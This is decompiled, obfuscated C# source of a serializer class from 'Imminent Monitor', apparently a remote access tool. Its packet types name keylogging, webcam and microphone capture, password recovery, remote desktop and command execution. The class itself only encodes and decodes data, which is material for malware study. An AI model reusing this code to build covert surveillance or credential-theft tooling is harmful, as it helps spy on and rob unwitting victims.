// Decompiled with JetBrains decompiler
// Type: Class159
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

internal sealed class Class159
{
  private Dictionary<Type, byte> dictionary_0;

  public Class159()
  {
    this.dictionary_0 = new Dictionary<Type, byte>();
    this.dictionary_0.Add(typeof (bool), (byte) 0);
    this.dictionary_0.Add(typeof (byte), (byte) 1);
    this.dictionary_0.Add(typeof (byte[]), (byte) 2);
    this.dictionary_0.Add(typeof (char), (byte) 3);
    this.dictionary_0.Add(typeof (char[]), (byte) 4);
    this.dictionary_0.Add(typeof (Decimal), (byte) 5);
    this.dictionary_0.Add(typeof (double), (byte) 6);
    this.dictionary_0.Add(typeof (int), (byte) 7);
    this.dictionary_0.Add(typeof (long), (byte) 8);
    this.dictionary_0.Add(typeof (sbyte), (byte) 9);
    this.dictionary_0.Add(typeof (short), (byte) 10);
    this.dictionary_0.Add(typeof (float), (byte) 11);
    this.dictionary_0.Add(typeof (string), (byte) 12);
    this.dictionary_0.Add(typeof (uint), (byte) 13);
    this.dictionary_0.Add(typeof (ulong), (byte) 14);
    this.dictionary_0.Add(typeof (ushort), (byte) 15);
    this.dictionary_0.Add(typeof (DateTime), (byte) 16);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProcessHeaderPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TransferHeader), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProxyPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ScriptPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WebcamPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ChatHeaderPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.CommandPromptPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TcpConnectionPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FastTransferPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ExecutePacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MessageBoxPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MicrophonePacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PasswordRecoveryPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MiscPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RegistryPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PluginPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileThumbnailGallery), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ServerHeader), (byte) 1);
    this.dictionary_0.Add(typeof (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.NetworkStatPacket), (byte) 1);
  }

  public byte[] method_0(object[] object_0)
  {
    byte[] numArray;
    try
    {
      MemoryStream output = new MemoryStream();
      BinaryWriter binaryWriter = new BinaryWriter((Stream) output, Encoding.UTF8);
      binaryWriter.Write(Convert.ToInt32(object_0.Length));
      int num1 = object_0.Length - 1;
      for (int index = 0; index <= num1; ++index)
      {
        byte num2 = this.dictionary_0[object_0[index].GetType()];
        binaryWriter.Write(num2);
        switch (num2)
        {
          case 0:
            binaryWriter.Write((bool) object_0[index]);
            break;
          case 1:
            binaryWriter.Write((byte) object_0[index]);
            break;
          case 2:
            binaryWriter.Write(((byte[]) object_0[index]).Length);
            binaryWriter.Write((byte[]) object_0[index]);
            break;
          case 3:
            binaryWriter.Write((char) object_0[index]);
            break;
          case 4:
            binaryWriter.Write(((char[]) object_0[index]).ToString());
            break;
          case 5:
            binaryWriter.Write((Decimal) object_0[index]);
            break;
          case 6:
            binaryWriter.Write((double) object_0[index]);
            break;
          case 7:
            binaryWriter.Write((int) object_0[index]);
            break;
          case 8:
            binaryWriter.Write((long) object_0[index]);
            break;
          case 9:
            binaryWriter.Write((sbyte) object_0[index]);
            break;
          case 10:
            binaryWriter.Write((short) object_0[index]);
            break;
          case 11:
            binaryWriter.Write((float) object_0[index]);
            break;
          case 12:
            binaryWriter.Write((string) object_0[index]);
            break;
          case 13:
            binaryWriter.Write((uint) object_0[index]);
            break;
          case 14:
            binaryWriter.Write((ulong) object_0[index]);
            break;
          case 15:
            binaryWriter.Write((ushort) object_0[index]);
            break;
          case 16:
            binaryWriter.Write(((DateTime) object_0[index]).ToBinary());
            break;
        }
      }
      binaryWriter.Close();
      numArray = output.ToArray();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public object[] method_1(byte[] byte_0) => this.method_3(byte_0, 0, byte_0.Length - 1);

  public object[] method_2(byte[] byte_0)
  {
    object[] objArray;
    try
    {
      BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(byte_0), Encoding.UTF8);
      List<object> objectList = new List<object>();
      int num = binaryReader.ReadInt32() - 1;
      for (int index = 0; index <= num; ++index)
      {
        switch (binaryReader.ReadByte())
        {
          case 0:
            objectList.Add((object) binaryReader.ReadBoolean());
            break;
          case 1:
            objectList.Add((object) binaryReader.ReadByte());
            break;
          case 2:
            objectList.Add((object) binaryReader.ReadBytes(binaryReader.ReadInt32()));
            break;
          case 3:
            objectList.Add((object) binaryReader.ReadChar());
            break;
          case 4:
            objectList.Add((object) binaryReader.ReadString().ToCharArray());
            break;
          case 5:
            objectList.Add((object) binaryReader.ReadDecimal());
            break;
          case 6:
            objectList.Add((object) binaryReader.ReadDouble());
            break;
          case 7:
            objectList.Add((object) binaryReader.ReadInt32());
            break;
          case 8:
            objectList.Add((object) binaryReader.ReadInt64());
            break;
          case 9:
            objectList.Add((object) binaryReader.ReadSByte());
            break;
          case 10:
            objectList.Add((object) binaryReader.ReadInt16());
            break;
          case 11:
            objectList.Add((object) binaryReader.ReadSingle());
            break;
          case 12:
            objectList.Add((object) binaryReader.ReadString());
            break;
          case 13:
            objectList.Add((object) binaryReader.ReadUInt32());
            break;
          case 14:
            objectList.Add((object) binaryReader.ReadUInt64());
            break;
          case 15:
            objectList.Add((object) binaryReader.ReadUInt16());
            break;
          case 16:
            objectList.Add((object) DateTime.FromBinary(binaryReader.ReadInt64()));
            break;
        }
      }
      binaryReader.Close();
      objArray = objectList.ToArray();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      objArray = (object[]) null;
      ProjectData.ClearProjectError();
    }
    return objArray;
  }

  public object[] method_3(byte[] byte_0, int int_0, int int_1)
  {
    object[] objArray;
    try
    {
      BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(byte_0, int_1, int_0), Encoding.UTF8);
      List<object> objectList = new List<object>();
      int num = binaryReader.ReadInt32() - 1;
      for (int index = 0; index <= num; ++index)
      {
        switch (binaryReader.ReadByte())
        {
          case 0:
            objectList.Add((object) binaryReader.ReadBoolean());
            break;
          case 1:
            objectList.Add((object) binaryReader.ReadByte());
            break;
          case 2:
            objectList.Add((object) binaryReader.ReadBytes(binaryReader.ReadInt32()));
            break;
          case 3:
            objectList.Add((object) binaryReader.ReadChar());
            break;
          case 4:
            objectList.Add((object) binaryReader.ReadString().ToCharArray());
            break;
          case 5:
            objectList.Add((object) binaryReader.ReadDecimal());
            break;
          case 6:
            objectList.Add((object) binaryReader.ReadDouble());
            break;
          case 7:
            objectList.Add((object) binaryReader.ReadInt32());
            break;
          case 8:
            objectList.Add((object) binaryReader.ReadInt64());
            break;
          case 9:
            objectList.Add((object) binaryReader.ReadSByte());
            break;
          case 10:
            objectList.Add((object) binaryReader.ReadInt16());
            break;
          case 11:
            objectList.Add((object) binaryReader.ReadSingle());
            break;
          case 12:
            objectList.Add((object) binaryReader.ReadString());
            break;
          case 13:
            objectList.Add((object) binaryReader.ReadUInt32());
            break;
          case 14:
            objectList.Add((object) binaryReader.ReadUInt64());
            break;
          case 15:
            objectList.Add((object) binaryReader.ReadUInt16());
            break;
          case 16:
            objectList.Add((object) DateTime.FromBinary(binaryReader.ReadInt64()));
            break;
        }
      }
      binaryReader.Close();
      objArray = objectList.ToArray();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      objArray = (object[]) null;
      ProjectData.ClearProjectError();
    }
    return objArray;
  }

  public byte[] method_4(object[] object_0)
  {
    byte[] numArray;
    try
    {
      MemoryStream output = new MemoryStream();
      BinaryWriter binaryWriter = new BinaryWriter((Stream) output, Encoding.UTF8);
      binaryWriter.Write(Convert.ToInt32(object_0.Length));
      int num1 = object_0.Length - 1;
      for (int index = 0; index <= num1; ++index)
      {
        this.method_5(object_0[index].GetType());
        byte num2 = this.dictionary_0[object_0[index].GetType()];
        binaryWriter.Write(num2);
        switch (num2)
        {
          case 0:
            binaryWriter.Write((bool) object_0[index]);
            break;
          case 1:
            binaryWriter.Write((byte) object_0[index]);
            break;
          case 2:
            binaryWriter.Write(((byte[]) object_0[index]).Length);
            binaryWriter.Write((byte[]) object_0[index]);
            break;
          case 3:
            binaryWriter.Write((char) object_0[index]);
            break;
          case 4:
            binaryWriter.Write(((char[]) object_0[index]).ToString());
            break;
          case 5:
            binaryWriter.Write((Decimal) object_0[index]);
            break;
          case 6:
            binaryWriter.Write((double) object_0[index]);
            break;
          case 7:
            binaryWriter.Write((int) object_0[index]);
            break;
          case 8:
            binaryWriter.Write((long) object_0[index]);
            break;
          case 9:
            binaryWriter.Write((sbyte) object_0[index]);
            break;
          case 10:
            binaryWriter.Write((short) object_0[index]);
            break;
          case 11:
            binaryWriter.Write((float) object_0[index]);
            break;
          case 12:
            binaryWriter.Write((string) object_0[index]);
            break;
          case 13:
            binaryWriter.Write((uint) object_0[index]);
            break;
          case 14:
            binaryWriter.Write((ulong) object_0[index]);
            break;
          case 15:
            binaryWriter.Write((ushort) object_0[index]);
            break;
          case 16:
            binaryWriter.Write(((DateTime) object_0[index]).ToBinary());
            break;
        }
      }
      binaryWriter.Close();
      numArray = output.ToArray();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = new byte[1]{ (byte) 90 };
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public void method_5(Type type_0)
  {
    if (!type_0.IsEnum || this.dictionary_0.ContainsKey(type_0))
      return;
    this.dictionary_0.Add(type_0, (byte) 1);
  }
}
